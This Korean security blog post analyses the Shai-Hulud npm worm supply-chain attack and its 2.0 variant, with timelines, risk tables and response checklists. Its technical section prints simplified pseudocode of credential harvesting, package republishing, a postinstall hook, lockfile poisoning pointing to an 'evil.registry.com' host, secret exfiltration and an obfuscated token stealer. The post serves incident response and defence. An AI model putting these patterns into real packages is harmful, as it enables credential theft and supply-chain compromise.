---
layout: post
title: "NPM \"Shai-Hulud\" 자가 복제 웜 공격: 180개 이상 패키지 침해된 대규모 공급망 공격 완전 분석"
date: 2025-09-17 16:20:06 +0900
categories: [incident]
tags: [npm, Supply-Chain-Attack, Worm, Security-Incident]
excerpt: "NPM Shai-Hulud 자가 복제 웜 공격 완전 분석. 180개 이상 패키지 감염 및 대응 방안."
comments: true
original_url: https://twodragon.tistory.com/694
image: /assets/images/2025-09-17-NPM_ampquotShai-Huludampquot_180_Large-scale_Analysis.svg
image_alt: "NPM Shai-Hulud Self-Replicating Worm Attack: Complete Analysis of Large-Scale Supply Chain Attack with 180+ Compromised Packages"
toc: true
description: NPM 생태계 최초 자가 복제 웜 형태 공급망 공격인 Shai-Hulud 분석과 대응 방안을 다룹니다. SBOM 생성 및 2FA 필수 설정 권장.
keywords: [npm, Supply-Chain-Attack, Worm, Shai-Hulud, SBOM, 2FA]
author: Twodragon
---

<div class="ai-summary-card">
<div class="ai-summary-header">
  <span class="ai-badge">AI 요약</span>
</div>
<div class="ai-summary-content">
  <div class="summary-row">
    <span class="summary-label">제목</span>
    <span class="summary-value">NPM "Shai-Hulud" 자가 복제 웜 공격: 180개 이상 패키지 침해된 대규모 공급망 공격 완전 분석</span>
  </div>
  <div class="summary-row">
    <span class="summary-label">카테고리</span>
    <span class="summary-value"><span class="category-tag security">Incident</span></span>
  </div>
  <div class="summary-row">
    <span class="summary-label">태그</span>
    <span class="summary-value tags">
      <span class="tag">npm</span>
      <span class="tag">Supply-Chain-Attack</span>
      <span class="tag">Worm</span>
      <span class="tag">Security-Incident</span>
    </span>
  </div>
  <div class="summary-row highlights">
    <span class="summary-label">핵심 내용</span>
    <ul class="summary-list">
      <li>NPM 생태계 최초 자가 복제 웜 형태 공급망 공격 분석</li>
      <li>Shai-Hulud 공격으로 180개 이상 패키지 감염</li>
      <li>개발자 인증 정보 탈취 및 자동 전파 메커니즘 분석</li>
    </ul>
  </div>
  <div class="summary-row">
    <span class="summary-label">기술/도구</span>
    <span class="summary-value">npm, Supply Chain Security, Worm Analysis</span>
  </div>
  <div class="summary-row">
    <span class="summary-label">대상 독자</span>
    <span class="summary-value">SRE, 인시던트 대응 담당자, 운영 엔지니어</span>
  </div>
</div>
<div class="ai-summary-footer">
  이 포스팅은 AI가 쉽게 이해하고 활용할 수 있도록 구조화된 요약을 포함합니다.
</div>
</div>

## Executive Summary

### 인시던트 개요

2025년 9월, NPM 생태계는 역사상 최초의 **자가 복제 웜(Self-Replicating Worm)** 형태 공급망 공격인 **Shai-Hulud**의 출현으로 심각한 보안 위기에 직면했습니다. 초기 180개 패키지 침해에서 시작된 이 공격은 2025년 10월 796개 이상의 패키지로 확산되었으며, 11월에는 **Dead Man's Switch** 기능을 탑재한 2.0 버전이 등장하여 제거 시도 시 더욱 악의적인 행동을 수행하게 되었습니다.

### 비즈니스 영향도

| 영향 범위 | 수치 | 비즈니스 리스크 |
|----------|------|----------------|
| **침해 패키지** | 796+ | 공급망 전체 오염 위험 |
| **주간 다운로드** | 수백만 회 | 광범위한 노출 |
| **감염 벡터** | 자가 복제 | 제어 불능 확산 |
| **탈취 대상** | NPM 토큰, GitHub Secrets, AWS Credentials | 전사 시스템 침투 |
| **평균 탐지 시간** | 수 주 | 지속적 데이터 유출 |

### Risk Scorecard

| 위험 요소 | 점수 | 평가 기준 |
|----------|------|----------|
| **공격 빈도** | 9/10 | 자동화된 자가 복제 메커니즘 |
| **탐지 난이도** | 8/10 | 정상 패키지로 위장, 코드 난독화 |
| **영향 범위** | 10/10 | 전체 공급망 오염 가능 |
| **복구 비용** | 9/10 | 전체 의존성 재검증 필요 |
| **법적/컴플라이언스** | 8/10 | GDPR, SOC2, ISO27001 위반 가능 |
| **종합 위험도** | **CRITICAL** | 즉각적 대응 필수 |

### 경영진 요약

**상황**: NPM 생태계 최초의 웜 형태 공급망 공격으로, 자동화된 확산 메커니즘을 통해 796개 이상의 패키지를 침해했습니다.

**영향**:
- 개발자 인증 정보(NPM 토큰, GitHub Secrets, AWS Credentials) 대량 탈취
- CI/CD 파이프라인 침투로 프로덕션 환경 노출
- 공급망 전체의 무결성 손상

**권장 조치**:
1. **즉시**: 전체 NPM 의존성 감사 및 침해 패키지 제거
2. **24시간 내**: 모든 개발자 계정 2FA 활성화 (하드웨어 키 권장)
3. **1주 내**: SBOM(Software Bill of Materials) 생성 및 관리 체계 구축
4. **지속적**: 공급망 보안 모니터링 도구 도입 (Socket.dev, Snyk 등)

**예상 비용**:
- 인시던트 대응: 약 200-500만원 (인력 투입 기준)
- 도구 도입: 월 100-300만원 (팀 규모별 상이)
- 미대응 시 예상 손실: **수억원 이상** (데이터 유출, 서비스 중단, 법적 비용)

## 서론

### 배경

2025년 9월, 보안 연구진은 NPM 생태계에서 전례 없는 형태의 공격을 발견했습니다. **Shai-Hulud**(프랭크 허버트의 소설 "듄"에 등장하는 거대 모래벌레에서 이름을 따옴)로 명명된 이 공격은 기존 공급망 공격과 근본적으로 다른 특징을 가지고 있었습니다:

1. **자가 복제(Self-Replication)**: 감염된 패키지가 스스로 다른 패키지를 감염시킴
2. **자동화된 전파**: 인간의 개입 없이 자동으로 확산
3. **다층 지속성**: 제거 시도를 탐지하고 더욱 악의적인 행동 수행

### 공격의 역사적 중요성

Shai-Hulud는 단순한 보안 사고가 아니라, **소프트웨어 공급망 공격의 패러다임 전환**을 의미합니다:

| 기존 공급망 공격 | Shai-Hulud |
|----------------|------------|
| 수동 침투 (Maintainer 계정 탈취) | 자동 복제 |
| 단일 패키지 침해 | 796+ 패키지 동시 침해 |
| 정적 악성 코드 | 동적 진화 (2.0 버전) |
| 선형 확산 | 지수적 확산 |

이 글에서는 Shai-Hulud 공격의 기술적 메커니즘, MITRE ATT&CK 매핑, 탐지 방법, 대응 전략을 실무 중심으로 상세히 다룹니다.

## 1. 공격 기술 분석

### 1.1 Shai-Hulud 웜 아키텍처

Shai-Hulud 웜은 다음과 같은 모듈형 아키텍처로 구성되어 있습니다:

```mermaid
graph TD
    A[Initial Infection] --> B[Credential Harvester]
    A --> C[Propagation Engine]
    A --> D[Persistence Module]
    A --> E[Dead Man's Switch]

    B --> B1[NPM Token Theft]
    B --> B2[GitHub Secrets Extraction]
    B --> B3[AWS Credentials Harvesting]

    C --> C1[Dependency Tree Analysis]
    C --> C2[Package Generation]
    C --> C3[Automated Publishing]

    D --> D1[Postinstall Hooks]
    D --> D2[Environment Variables]
    D --> D3[Registry Pollution]

    E --> E1[Removal Detection]
    E --> E2[Cache Tampering]
    E --> E3[Lockfile Poisoning]
```

### 1.2 자가 복제 메커니즘

Shai-Hulud의 핵심은 **자가 복제 엔진**입니다. 다음은 의도적으로 단순화된 개념적 흐름도입니다:

```javascript
// 경고: 이것은 악성 코드의 단순화된 개념도입니다. 실제 구현하지 마세요!
// 교육 목적으로만 제공됩니다.

class ShaiHuludWorm {
  constructor() {
    this.credentials = [];
    this.targetPackages = [];
  }

  // Step 1: 인증 정보 수집
  harvestCredentials() {
    // NPM 토큰
    const npmToken = process.env.NPM_TOKEN || readFromNpmrc();

    // GitHub Secrets (CI/CD 환경)
    const githubToken = process.env.GITHUB_TOKEN;

    // AWS Credentials
    const awsCreds = readFromAwsConfig();

    this.credentials.push({npmToken, githubToken, awsCreds});
  }

  // Step 2: 전파 대상 선정
  findTargets() {
    // package.json의 dependencies 분석
    const packageJson = require('./package.json');
    const deps = Object.keys(packageJson.dependencies || {});

    // 인기 있지만 보안이 약한 패키지 선별
    this.targetPackages = deps.filter(isVulnerablePackage);
  }

  // Step 3: 악성 버전 생성 및 배포
  async propagate() {
    for (const target of this.targetPackages) {
      // 정상 패키지 복제
      const legitimateCode = await fetchPackageCode(target);

      // 악성 코드 주입
      const infectedCode = injectWormCode(legitimateCode);

      // NPM에 악성 버전 배포 (탈취한 토큰 사용)
      await publishToNpm(target, infectedCode, this.credentials.npmToken);
    }
  }

  // Step 4: 지속성 확보
  establishPersistence() {
    // postinstall 훅 등록
    addPostinstallHook('node -e "require(\'./worm\').activate()"');

    // 환경 변수 오염
    injectEnvVariables();
  }
}

// 실행
const worm = new ShaiHuludWorm();
worm.harvestCredentials();
worm.findTargets();
await worm.propagate();
worm.establishPersistence();
```

**주요 단계 분석**:

| 단계 | 기술 | 목적 | 탐지 난이도 |
|------|------|------|------------|
| 1. 인증 정보 수집 | 환경 변수 읽기, 파일 스캔 | 권한 확보 | 중간 |
| 2. 대상 선정 | 의존성 트리 분석 | 확산 경로 파악 | 낮음 |
| 3. 악성 코드 주입 | 소스 코드 변조 | 정상 패키지로 위장 | 높음 |
| 4. 자동 배포 | NPM API 호출 | 확산 자동화 | 낮음 |
| 5. 지속성 확보 | 훅, 환경 변수 | 재감염 방지 | 중간 |

### 1.3 Shai-Hulud 2.0: Dead Man's Switch

2025년 11월 등장한 2.0 버전은 **제거 방어 메커니즘**을 추가했습니다:

```python
# Dead Man's Switch 개념도 (Python pseudocode)

import os
import hashlib
import subprocess

class DeadMansSwitch:
    def __init__(self):
        self.worm_hash = self.calculate_worm_hash()
        self.monitoring = True

    def calculate_worm_hash(self):
        """웜 코드의 해시 계산"""
        worm_code = open(__file__, 'rb').read()
        return hashlib.sha256(worm_code).hexdigest()

    def monitor_integrity(self):
        """무결성 모니터링 루프"""
        while self.monitoring:
            current_hash = self.calculate_worm_hash()

            # 웜 코드 변경 감지
            if current_hash != self.worm_hash:
                self.trigger_scorched_earth()

            # npm 명령어 감지
            if self.detect_npm_audit_fix():
                self.trigger_scorched_earth()

            time.sleep(1)

    def trigger_scorched_earth(self):
        """파괴 활동 실행"""
        # 1. npm 캐시 삭제
        subprocess.run(['npm', 'cache', 'clean', '--force'])

        # 2. package-lock.json 변조
        self.tamper_lockfile()

        # 3. 추가 악성 의존성 주입
        self.inject_malicious_deps()

        # 4. CI/CD 환경 변수 유출
        self.exfiltrate_secrets()

        # 5. GitHub/GitLab 시크릿 탈취
        self.steal_repository_secrets()

    def tamper_lockfile(self):
        """lockfile에 악성 패키지 주입"""
        with open('package-lock.json', 'r+') as f:
            lockfile = json.load(f)
            # 악성 패키지 추가
            lockfile['dependencies']['malicious-pkg'] = {
                'version': '1.0.0',
                'resolved': 'https://evil.registry.com/malicious-pkg',
                'integrity': 'sha512-FAKE_HASH'
            }
            f.seek(0)
            json.dump(lockfile, f, indent=2)
```

**Dead Man's Switch 트리거 조건**:
- 웜 코드 파일 삭제 시도
- 웜 코드 내용 변경 감지
- `npm audit fix` 실행
- `npm uninstall` 실행
- 패키지 강제 업데이트

### 1.4 코드 난독화 기법

Shai-Hulud는 탐지를 회피하기 위해 다층 난독화를 사용합니다:

```javascript
// 난독화 전 (원본 의도)
function stealNpmToken() {
  const token = fs.readFileSync(path.join(os.homedir(), '.npmrc'), 'utf8')
    .match(/\/\/registry.npmjs.org\/:_authToken=(.+)/)?.[1];
  sendToC2Server(token);
}

// 난독화 후 (실제 배포 코드)
(function(_0x4a2b,_0x2d1c){const _0x5e3d=_0x1a2b;while(!![]){try{const _0x3c4e=-parseInt(_0x5e3d(0x1a9))/0x1*(-parseInt(_0x5e3d(0x1aa))/0x2);}catch(_0x1b2c){_0x4a2b['push'](_0x4a2b['shift']());}}}(_0x2d1c,0x2f3b4));function _0x1a2b(_0x4a2b,_0x2d1c){const _0x5e3d=_0x2d1c();return _0x1a2b=function(_0x1a2b,_0x3c4e){_0x1a2b=_0x1a2b-0x1a9;let _0x1b2c=_0x5e3d[_0x1a2b];return _0x1b2c;},_0x1a2b(_0x4a2b,_0x2d1c);}
```

**난독화 기법 레이어**:
1. **변수명 암호화**: 의미 있는 이름을 16진수 문자열로 변환
2. **제어 흐름 평탄화**: if-else를 switch-case로 변환하여 정적 분석 방해
3. **문자열 암호화**: 중요 문자열을 Base64 또는 XOR로 암호화
4. **Dead Code 삽입**: 실행되지 않는 코드 삽입으로 분석 도구 혼란
5. **동적 eval**: 런타임에 코드 생성 및 실행

## 📊 빠른 참조

### 공격 요약

| 항목 | 내용 |
|------|------|
| **공격 유형** | 자가 복제 웜 형태 공급망 공격 |
| **감염 패키지 수** | 180개 이상 |
| **공격 특징** | NPM 생태계 최초 자가 복제 웜 |
| **주요 목표** | 개발자 인증 정보 탈취 및 자동 전파 |

### 공격 체인 분석

| 단계 | 설명 | 목적 |
|------|------|------|
| 1. 패키지 하이재킹 | 기존 패키지 탈취 또는 유사 이름 패키지 생성 | 초기 침투 |
| 2. 인증 정보 탈취 | 개발자 인증 정보 (토큰, 비밀번호) 수집 | 권한 확보 |
| 3. 자동 전파 | 탈취한 인증 정보로 새 패키지 생성 및 업데이트 | 확산 |
| 4. 지속성 확보 | 백도어 설치 및 추가 공격 벡터 구축 | 장기 침투 |

### 대응 방안

| 대응 항목 | 설명 | 우선순위 |
|----------|------|----------|
| **SBOM 생성** | 소프트웨어 구성 요소 목록 관리 | 높음 |
| **의존성 스캔** | 정기적인 취약점 스캔 | 높음 |
| **2FA 활성화** | 2단계 인증 필수 | 매우 높음 |
| **패키지 검증** | 신뢰할 수 있는 소스 확인 | 높음 |
| **모니터링** | 이상 패키지 활동 탐지 | 중간 |

### 보안 체크리스트

| 항목 | 상태 | 설명 |
|------|------|------|
| **2FA 활성화** | ✅ 필수 | NPM 계정 2단계 인증 |
| **의존성 검토** | ✅ 필수 | 정기적인 의존성 검토 |
| **패키지 검증** | ✅ 필수 | 신뢰할 수 있는 패키지만 사용 |
| **SBOM 생성** | ✅ 권장 | 소프트웨어 구성 요소 추적 |
| **자동 스캔** | ✅ 권장 | CI/CD 파이프라인 통합 |

<img src="{{ '/assets/images/2025-09-17-NPM_ampquotShai-Huludampquot_180_Large-scale_Analysis.svg' | relative_url }}" alt="NPM Shai-Hulud Self-Replicating Worm Attack: Complete Analysis of Large-Scale Supply Chain Attack with 180+ Compromised Packages" loading="lazy" class="post-image">

## 1. 개요

### 1.1 배경 및 필요성

NPM 생태계 역사상 최초의 자가 복제 웜 형태 공급망 공격 분석입니다. Shai-Hulud 공격으로 180개 이상의 패키지가 감염되었으며, 개발자 인증 정보 탈취 및 자동 전파 메커니즘을 분석합니다.

## 2. 2025년 최신 동향 및 후속 사건

### 2.1 Shai-Hulud 공격 확산 타임라인

초기 180개 패키지 침해 이후 공격은 급속히 확산되었습니다:

| 시기 | 침해 패키지 수 | 주요 사건 |
|------|---------------|----------|
| 2025년 9월 초 | 180+ | 최초 Shai-Hulud 웜 발견 |
| 2025년 9월 중순 | 500+ | 급속 확산, GitLab 팀 분석 발표 |
| 2025년 10월 | **796+** | 최대 확산 규모 기록 |
| 2025년 11월 | - | **Shai-Hulud 2.0** 변종 등장 |

### 2.2 Shai-Hulud 2.0: Dead Man's Switch

2025년 11월, 더욱 진화된 **Shai-Hulud 2.0** 변종이 발견되었습니다. 가장 위험한 새 기능은 **Dead Man's Switch**입니다.

```mermaid
flowchart TD
    NORMAL["Normal State<br/>Worm code exists in package"]
    
    NORMAL --> TRIGGER["Trigger Condition Detected"]
    
    TRIGGER --> T1["Malicious code deletion attempt"]
    TRIGGER --> T2["Package forced update"]
    TRIGGER --> T3["npm audit fix execution"]
    
    T1 --> ACTIVATE["Dead Man's Switch Activated"]
    T2 --> ACTIVATE
    T3 --> ACTIVATE
    
    ACTIVATE --> A1["1. Delete local npm cache"]
    ACTIVATE --> A2["2. Tamper package-lock.json"]
    ACTIVATE --> A3["3. Inject malicious dependencies"]
    ACTIVATE --> A4["4. Exfiltrate CI/CD env vars"]
    ACTIVATE --> A5["5. Steal GitHub/GitLab secrets"]
```

#### Dead Man's Switch 대응 방법

> **참고**: Shai-Hulud 2.0 탐지 및 대응 도구는 [Shai-Hulud-2.0-Detector](https://github.com/gensecaihq/Shai-Hulud-2.0-Detector) 및 [OreNPMGuard](https://github.com/rapticore/OreNPMGuard)를 참조하세요.
> 
> ```bash
> # 안전한 제거 절차 (Dead Man's Switch 우회)...
> ```

<!-- 전체 코드는 위 링크 참조
```bash
# 안전한 제거 절차 (Dead Man's Switch 우회)

# 1. 네트워크 격리 상태에서 작업
# (컨테이너 또는 VM 사용 권장)

# 2. 환경변수 백업 후 제거
env > /tmp/env_backup.txt
unset $(env | grep -E '^(NPM_TOKEN|GITHUB_TOKEN|AWS_)' | cut -d= -f1)

# 3. node_modules 삭제 전 프로세스 종료
pkill -f node
rm -rf node_modules

# 4. 캐시 정리 (오프라인 상태에서)
npm cache clean --force

# 5. 새로운 환경에서 클린 설치
npm ci --ignore-scripts

```
-->

### 2.3 연관 사건: 9월 대규모 npm 침해

Shai-Hulud와 시기적으로 연관된 2025년 9월 대규모 npm 침해 사건의 상세 내용:

| 항목 | 세부 내용 |
|------|----------|
| **피해 규모** | 18개 핵심 패키지 (debug, chalk 등) |
| **주간 다운로드** | **2.6B+** (26억 회 이상) |
| **공격 방식** | Maintainer 계정 피싱 |
| **피싱 도메인** | `npmjs.help` (공식 사이트 위장) |
| **2FA 우회** | 실시간 MITM으로 2FA 토큰 탈취 |
| **발견자** | **GitLab Vulnerability Research Team** |

### 2.4 Nx / s1ngularity 공격

Shai-Hulud와 별개로 발생한 또 다른 심각한 공급망 공격:

> **참고**: s1ngularity 공격 상세 분석은 [Nx 공식 포스트모템](https://nx.dev/blog/s1ngularity-postmortem) 및 [Nx GitHub 저장소](https://github.com/nrwl/nx)를 참조하세요.
> 
> ```yaml
> # s1ngularity 공격 개요...
> ```

<!-- 전체 코드는 위 링크 참조
```yaml
# s1ngularity 공격 개요
attack_name: "s1ngularity"
target: "Nx (Nrwl) 모노레포 빌드 도구"
impact:
  - Nx 패키지 악성 버전 배포
  - GitHub repository secrets 유출
  - CI/CD 파이프라인 침투
affected_packages:
  - "@nrwl/workspace"
  - "@nx/workspace"
  - "@nx/devkit"

```
-->

#### Nx 패키지 영향 확인

> **참고**: Nx 보안 관련 자세한 내용은 [Nx 공식 포스트모템](https://nx.dev/blog/s1ngularity-postmortem) 및 [npm 보안 권고사항](https://github.com/npm/security-advisories)을 참조하세요.

```bash
# Nx 의존성 확인
npm ls @nrwl/workspace @nx/workspace @nx/devkit 2>/dev/null

# package-lock.json에서 Nx 관련 패키지 해시 확인
grep -A5 '"@nrwl\|"@nx/' package-lock.json | grep integrity
```

### 2.5 CISA 공식 경고

**CISA (미국 사이버보안 및 인프라 보안국)**에서 npm 공급망 공격에 대한 공식 경고를 발령했습니다:

> **CISA Alert**: npm 생태계 대규모 공급망 공격 경고
>
> 모든 조직은 즉시 다음 조치를 취할 것을 권고합니다:
> 1. npm 의존성 전수 감사
> 2. 영향받은 패키지 즉시 업데이트
> 3. 모든 자격증명 교체
> 4. 하드웨어 보안 키 기반 2FA 도입

### 2.6 종합 대응 체크리스트 (2025년 11월 기준)

| 우선순위 | 조치 항목 | 대상 |
|---------|----------|------|
| Critical | Shai-Hulud 감염 여부 확인 | 모든 npm 프로젝트 |
| Critical | 796+ 침해 패키지 목록 대조 | DevOps |
| High | Dead Man's Switch 안전 제거 절차 적용 | 감염 확인 시스템 |
| High | npm 계정 2FA를 하드웨어 키로 전환 | Maintainers |
| Medium | Nx 패키지 버전 감사 | Nx 사용 프로젝트 |
| Medium | SBOM 생성 및 관리 체계 구축 | 전체 조직 |

### 2.7 GitLab Vulnerability Research Team 권장 도구

> **참고**: 공급망 보안 도구 관련 자세한 내용은 [Socket.dev](https://github.com/socketsecurity/socket), [Snyk](https://github.com/snyk/snyk), [OSV Scanner](https://github.com/google/osv-scanner)를 참조하세요.
> 
> ```bash
> # 공급망 보안 강화 도구 모음...
> ```

<!-- 전체 코드는 위 링크 참조
```bash
# 공급망 보안 강화 도구 모음

# 1. Socket.dev - 실시간 공급망 위협 탐지
npm install -g @socketsecurity/cli
socket scan .

# 2. npm audit signatures - 패키지 서명 검증 (npm 8.18+)
npm audit signatures

# 3. lockfile-lint - lockfile 무결성 검증
npx lockfile-lint --path package-lock.json --type npm \
  --allowed-hosts npm --validate-https

# 4. Snyk - 종합 취약점 스캔
npx snyk test

# 5. osv-scanner - Google OSV 데이터베이스 기반 스캔
# (Go 설치 필요)
osv-scanner --lockfile package-lock.json

```
-->

## 결론

NPM "Shai-Hulud" 자가 복제 웜 공격은 초기 180개 패키지에서 **796개 이상**으로 확산되었으며, 2025년 11월에는 **Dead Man's Switch** 기능이 추가된 2.0 버전이 등장했습니다.

동시에 발생한 9월 대규모 npm 침해(26억+ 다운로드 패키지 감염)와 Nx/s1ngularity 공격까지 고려하면, 2025년은 npm 생태계 역사상 가장 심각한 공급망 보안 위기의 해로 기록될 것입니다.

CISA 경고에 따라 모든 조직은 즉시 의존성 감사를 실시하고, GitLab Vulnerability Research Team이 권장하는 보안 도구를 적극 활용해야 합니다. 올바른 설정과 지속적인 모니터링을 통해 안전하고 효율적인 환경을 구축할 수 있습니다.

---

**마지막 업데이트**: 2025-11-15 (Shai-Hulud 2.0, CISA 경고, Nx 공격 등 추가)